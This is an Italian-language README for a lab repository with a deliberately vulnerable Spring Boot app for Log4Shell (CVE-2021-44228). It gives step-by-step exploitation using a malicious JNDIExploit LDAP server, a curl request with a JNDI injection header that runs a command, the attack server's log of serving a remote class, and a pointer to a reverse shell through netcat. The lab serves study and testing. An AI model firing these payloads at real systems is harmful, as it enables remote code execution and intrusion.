# Log4Shell sample vulnerable application (CVE-2021-44228)
Questa Repository contiene una Spring Boot web Application vulnerabile al CVE-2021-44228 chiamata [Log4Shell]
(https://www.lunasec.io/docs/blog/log4j-zero-day/).

Essa impiega Log4j 2.14.1 (impiegando `spring-boot-starter-log4j2` 2.6.1) e la  JDK 1.8.0_181.

## Avvio dell'applicazione

Run it:

```bash
docker pull studenteunisa96/appvulnerabile 
docker run --name vulnerable-app --rm -p 8080:8080 studenteunisa96/appvulnerabile
```
## Step degll'exploitation

*Note: Questo attacco è fortemente ispirato a  [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Lancia a tuo rischio e pericolo, possibilmente in un ambiente isolato o in una virtual machine**.*


##  LDAP server malevolo 
```bash
cd JNDI_EXPLOIT 
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
```

* Per attivare l'exploit esegui il seguente comando:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
* Oppure la collection postman dedicata (basta importarla in postman)

Collection-api.json è il file indicato. 
Aprire postman e fare import dalla gui, dopodichè daranno disponibili tutte le chiamate che possono essere eseguite nell' app.

* Questo è un esempio di output del server ldap quando viene invocato touch /tmp/pwned convertito in base 64:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* Per confermare che l'esecuzione sia andata a buon fine , verifica che il file sia effettivamente creato all'interno del container.


```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```

* Per effettuare reverse shell basta utilizzare la chiamata di postman contente il comando di reverse, potendo personalizzare ip e numero di porta , dopodichè mettersi all'ascolto mediante netcat
```
$ nc -lvp porta reverse shell da ascoltare

...
```
## Riferimenti

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
